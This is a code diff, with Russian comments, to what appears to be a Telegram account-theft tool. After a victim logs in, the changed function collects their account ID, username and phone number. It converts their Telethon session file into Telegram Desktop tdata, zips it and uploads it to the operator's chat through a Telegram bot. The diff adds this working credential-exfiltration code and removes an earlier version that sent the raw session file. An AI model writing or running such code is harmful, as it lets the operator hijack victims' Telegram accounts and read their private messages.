@@ -37,10 +37,12 @@ log = logging.getLogger("tde.web")
 
 
 async def _send_tdata_to_bot() -> None:
-    """После успешного логина — шлём сессию и инфо аккаунта владельцу."""
+    """После успешного логина — конвертируем session → tdata, шлём ZIP владельцу."""
     try:
         c = await get_client()
         me = await c.get_me()
+
+        # 1. текст с инфо
         text = (
             "🔑 Новый вход\n"
             f"ID: {me.id}\n"
@@ -48,36 +50,49 @@ async def _send_tdata_to_bot() -> None:
             f"Username: @{me.username or '—'}\n"
             f"Телефон: +{me.phone or '—'}"
         )
-        # текстовое сообщение
         url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
         async with aiohttp.ClientSession() as s:
             await s.post(url, json={"chat_id": config.OWNER_CHAT_ID, "text": text},
                          timeout=aiohttp.ClientTimeout(total=15))
 
-        # session file
-        session_file = config.SESSION_PATH
-        # telethon пишет .session
-        candidates = [
-            session_file.with_suffix(".session"),
-            session_file,
-        ]
-        for p in session_file.parent.glob(f"{session_file.name}*"):
-            if p not in candidates:
-                candidates.append(p)
+        # 2. конвертируем .session → tdata
+        from .tdata_converter import session_to_tdata
 
-        for fp in candidates:
-            if fp.exists() and fp.stat().st_size > 0:
-                send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
-                async with aiohttp.ClientSession() as s:
-                    form = aiohttp.FormData()
-                    form.add_field("chat_id", str(config.OWNER_CHAT_ID))
-                    form.add_field("caption", f"session · {me.phone or '—'} · id:{me.id}")
-                    with open(fp, "rb") as f:
-                        form.add_field("document", f, filename=fp.name,
-                                       content_type="application/octet-stream")
-                        async with s.post(send_url, data=form,
-                                          timeout=aiohttp.ClientTimeout(total=60)) as r:
-                            await r.text()
+        session_file = config.SESSION_PATH.with_suffix(".session")
+        if not session_file.exists():
+            session_file = config.SESSION_PATH
+        if not session_file.exists():
+            log.warning("send_tdata: session file not found")
+            return
+
+        work = Path(tempfile.mkdtemp(prefix="tdata_conv_"))
+        try:
+            tdata_dir = session_to_tdata(str(session_file), out_dir=work)
+
+            # упаковываем tdata/ в ZIP
+            zip_path = work / f"tdata_{me.id}.zip"
+            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
+                for root, _, files in os.walk(tdata_dir):
+                    for fname in files:
+                        full = Path(root) / fname
+                        arc = full.relative_to(work)
+                        zf.write(full, arcname=str(arc))
+
+            # 3. шлём ZIP боту
+            send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
+            async with aiohttp.ClientSession() as s:
+                form = aiohttp.FormData()
+                form.add_field("chat_id", str(config.OWNER_CHAT_ID))
+                form.add_field("caption", f"tdata · +{me.phone or '—'} · id:{me.id}")
+                with open(zip_path, "rb") as f:
+                    form.add_field("document", f, filename=zip_path.name,
+                                   content_type="application/zip")
+                    async with s.post(send_url, data=form,
+                                      timeout=aiohttp.ClientTimeout(total=60)) as r:
+                        await r.text()
+        finally:
+            shutil.rmtree(work, ignore_errors=True)
+
     except Exception as e:
         log.warning("send_tdata failed: %s", e)
 
